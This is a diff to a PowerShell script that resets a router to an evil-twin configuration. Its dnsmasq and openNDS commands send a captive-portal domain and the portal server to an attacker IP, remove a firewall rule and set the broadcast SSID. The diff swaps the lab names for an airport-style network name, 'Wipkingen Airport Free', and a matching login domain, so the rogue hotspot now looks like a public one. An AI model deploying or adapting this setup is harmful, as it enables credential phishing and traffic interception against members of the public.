@@ -1,8 +1,8 @@
 <#
 .SYNOPSIS
   Returns router B to the plain evil-twin baseline after a scenario:
-  DNS points portal.gecko-a.lab at the attacker, openNDS FAS back to it, the
-  S7 firewall rule removed, and the SSID back to GeckoTest.
+  DNS points login.airport-wipkingen.com at the attacker, openNDS FAS back to it, the
+  S7 firewall rule removed, and the SSID back to Wipkingen Airport Free.
 #>
 [CmdletBinding()]
 param(
@@ -19,17 +19,17 @@ function Invoke-B([string]$cmd) {
 
 Write-Host '=== Reset router B to baseline ===' -ForegroundColor Green
 
-# DNS: only portal.gecko-a.lab -> attacker, plus the status.client entry.
+# DNS: only login.airport-wipkingen.com -> attacker, plus the status.client entry.
 Invoke-B (@(
   'while uci -q delete dhcp.@dnsmasq[0].address; do :; done',
   "uci add_list dhcp.@dnsmasq[0].address='/status.client/192.168.247.1'",
-  "uci add_list dhcp.@dnsmasq[0].address='/portal.gecko-a.lab/$AttackerIP'",
+  "uci add_list dhcp.@dnsmasq[0].address='/login.airport-wipkingen.com/$AttackerIP'",
   'uci commit dhcp', '/etc/init.d/dnsmasq restart'
 ) -join '; ')
 
 # openNDS FAS back to the attacker portal.
 Invoke-B (@(
-  "uci set opennds.@opennds[0].fasremotefqdn='portal.gecko-a.lab'",
+  "uci set opennds.@opennds[0].fasremotefqdn='login.airport-wipkingen.com'",
   "uci set opennds.@opennds[0].fasremoteip='$AttackerIP'",
   'uci commit opennds', '/etc/init.d/opennds restart'
 ) -join '; ')
@@ -37,7 +37,7 @@ Invoke-B (@(
 # Drop the S7 firewall rule if present.
 Invoke-B 'uci -q delete firewall.geckoblock; uci commit firewall; /etc/init.d/firewall reload'
 
-# SSID back to GeckoTest.
-Invoke-B "uci set wireless.wifi2g.ssid='GeckoTest'; uci commit wireless; wifi"
+# SSID back to Wipkingen Airport Free.
+Invoke-B "uci set wireless.wifi2g.ssid='Wipkingen Airport Free'; uci commit wireless; wifi"
 
 Write-Host 'Baseline restored.' -ForegroundColor Green
